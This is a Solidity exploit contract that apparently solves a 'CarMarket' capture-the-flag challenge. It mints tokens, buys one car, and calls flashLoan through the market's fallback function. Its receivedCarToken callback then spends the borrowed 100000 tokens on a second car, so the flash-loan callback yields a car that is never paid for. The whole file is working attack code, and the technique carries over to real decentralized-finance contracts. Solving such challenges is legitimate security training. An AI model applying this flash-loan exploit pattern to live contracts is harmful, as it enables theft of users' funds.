pragma solidity 0.8.13;

import "../interfaces/ICarMarket.sol";
import "../interfaces/ICarToken.sol";

error NotOwner();

contract Attack {
    address public owner;
    ICarToken token;
    ICarMarket market;
    address factory;

    constructor(
        address _token,
        address _market,
        address _factory
    ) {
        owner = msg.sender;
        token = ICarToken(_token);
        market = ICarMarket(_market);
        factory = _factory;
    }

    modifier onlyOwner() {
        if (msg.sender != owner) revert NotOwner();
        _;
    }

    function attack() external onlyOwner {
        // Mint 1e18 tokens
        token.mint();
        // Approve the market for spending
        token.approve(address(market), 1 ether);
        // Buy a car
        market.purchaseCar("tears", "clownmobile", "Cl0Wn");

        // Call flashloan via the CarMarket fallback function
        bytes memory data = abi.encodeWithSignature(
            "flashLoan(uint256)",
            100000 ether
        );
        (bool success, ) = address(market).call(data);
    }

    function receivedCarToken(address factory) external {
        // Buy another car
        token.approve(address(market), 100000 ether);
        market.purchaseCar("REKT", "REKT", "REKT");
    }
}
